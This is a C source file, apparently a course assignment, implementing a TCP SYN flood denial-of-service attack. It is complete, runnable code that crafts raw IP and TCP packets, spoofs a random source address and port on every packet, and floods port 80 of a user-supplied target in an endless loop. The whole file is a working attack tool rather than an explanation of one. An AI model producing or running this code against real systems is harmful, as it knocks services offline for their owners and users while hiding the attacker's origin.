/*
 * Assignment 1: TCP SYN Flood Attack
 * Usage: ./syn_flood <target_ip> <timeout_us>
 *
 * Sends crafted TCP SYN packets with randomized source IP/port
 * to exhaust the target's half-open connection table.
 *
 * Must be run as root (raw sockets).
 */

#define _GNU_SOURCE   /* usleep, useconds_t */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <sys/socket.h>

/* --- Portable TCP header (avoids glibc bitfield-ordering issues) --- */
struct tcp_hdr {
    uint16_t th_sport;
    uint16_t th_dport;
    uint32_t th_seq;
    uint32_t th_ack;
    uint8_t  th_offx2;   /* (data offset << 4) | reserved */
    uint8_t  th_flags;
    uint16_t th_win;
    uint16_t th_sum;
    uint16_t th_urp;
};

#define TH_SYN 0x02
#define TCP_HDR_LEN 20

/* Pseudo-header for TCP checksum calculation */
struct pseudo_header {
    uint32_t src_addr;
    uint32_t dst_addr;
    uint8_t  placeholder;
    uint8_t  protocol;
    uint16_t tcp_length;
};

/*
 * Generic checksum (RFC 1071).
 */
static uint16_t checksum(const void *buf, size_t len)
{
    const uint16_t *ptr = buf;
    uint32_t sum = 0;

    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    if (len == 1) {
        uint16_t last = 0;
        memcpy(&last, ptr, 1);
        sum += last;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}

/* Generate a random IP that avoids 0.x.x.x and 127.x.x.x */
static uint32_t rand_ip(void)
{
    uint32_t ip;
    do {
        ip = (uint32_t)rand();
    } while ((ip & 0xFF) == 0 || (ip & 0xFF) == 127);
    return ip;
}

static void usage(const char *prog)
{
    fprintf(stderr, "Usage: %s <target_ip> <timeout_us>\n", prog);
    fprintf(stderr, "  target_ip  - IPv4 address of the target\n");
    fprintf(stderr, "  timeout_us - delay between packets in microseconds\n");
}

int main(int argc, char *argv[])
{
    if (argc != 3) {
        usage(argv[0]);
        return EXIT_FAILURE;
    }

    /* Parse and validate target IP */
    struct in_addr target_addr;
    if (inet_pton(AF_INET, argv[1], &target_addr) != 1) {
        fprintf(stderr, "Error: invalid target IP '%s'\n", argv[1]);
        return EXIT_FAILURE;
    }

    /* Parse and validate timeout */
    char *endptr = NULL;
    errno = 0;
    long timeout_us = strtol(argv[2], &endptr, 10);
    if (errno != 0 || endptr == argv[2] || *endptr != '\0' ||
        timeout_us < 0 || timeout_us > 10000000) {
        fprintf(stderr, "Error: invalid timeout '%s' (0 - 10000000 us)\n", argv[2]);
        return EXIT_FAILURE;
    }

    /* Create raw socket with IP_HDRINCL so we craft the full IP header */
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("socket (are you root?)");
        return EXIT_FAILURE;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt IP_HDRINCL");
        close(sockfd);
        return EXIT_FAILURE;
    }

    srand((unsigned)time(NULL) ^ (unsigned)getpid());

    /*
     * Packet buffer: IP header + TCP header.
     * No payload needed for a SYN packet.
     */
    char packet[sizeof(struct iphdr) + TCP_HDR_LEN];
    memset(packet, 0, sizeof(packet));

    struct iphdr   *iph  = (struct iphdr *)packet;
    struct tcp_hdr *tcph = (struct tcp_hdr *)(packet + sizeof(struct iphdr));

    /* Destination address for sendto() */
    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr   = target_addr;

    /* Target port: common HTTP port (can be changed) */
    uint16_t target_port = 80;

    unsigned long count = 0;

    printf("[*] SYN Flood -> %s:%u  (delay %ld us)\n",
           argv[1], target_port, timeout_us);
    printf("[*] Press Ctrl+C to stop.\n");

    while (1) {
        /* Randomize source IP and source port each iteration */
        uint32_t src_ip   = rand_ip();
        uint16_t src_port = (uint16_t)(1024 + (rand() % (65535 - 1024)));

        /* ---- IP header ---- */
        iph->ihl      = 5;
        iph->version   = 4;
        iph->tos       = 0;
        iph->tot_len   = htons((uint16_t)sizeof(packet));
        iph->id        = htons((uint16_t)(rand() & 0xFFFF));
        iph->frag_off  = 0;
        iph->ttl       = 64;
        iph->protocol  = IPPROTO_TCP;
        iph->check     = 0;
        iph->saddr     = src_ip;
        iph->daddr     = target_addr.s_addr;

        iph->check = checksum(iph, sizeof(struct iphdr));

        /* ---- TCP header ---- */
        tcph->th_sport  = htons(src_port);
        tcph->th_dport  = htons(target_port);
        tcph->th_seq    = htonl((uint32_t)rand());
        tcph->th_ack    = 0;
        tcph->th_offx2  = (5 << 4);     /* data offset = 5 (20 bytes) */
        tcph->th_flags  = TH_SYN;
        tcph->th_win    = htons(65535);
        tcph->th_sum    = 0;
        tcph->th_urp    = 0;

        /* TCP checksum with pseudo-header */
        char csum_buf[sizeof(struct pseudo_header) + TCP_HDR_LEN];
        memset(csum_buf, 0, sizeof(csum_buf));

        struct pseudo_header *psh = (struct pseudo_header *)csum_buf;
        psh->src_addr    = src_ip;
        psh->dst_addr    = target_addr.s_addr;
        psh->placeholder = 0;
        psh->protocol    = IPPROTO_TCP;
        psh->tcp_length  = htons(TCP_HDR_LEN);

        memcpy(csum_buf + sizeof(struct pseudo_header), tcph, TCP_HDR_LEN);
        tcph->th_sum = checksum(csum_buf, sizeof(csum_buf));

        /* Send */
        ssize_t sent = sendto(sockfd, packet, sizeof(packet), 0,
                              (struct sockaddr *)&dest, sizeof(dest));
        if (sent < 0) {
            perror("sendto");
        }

        count++;
        if (count % 1000 == 0) {
            printf("[*] Sent %lu SYN packets\n", count);
        }

        if (timeout_us > 0) {
            usleep((useconds_t)timeout_us);
        }
    }

    close(sockfd);
    return EXIT_SUCCESS;
}
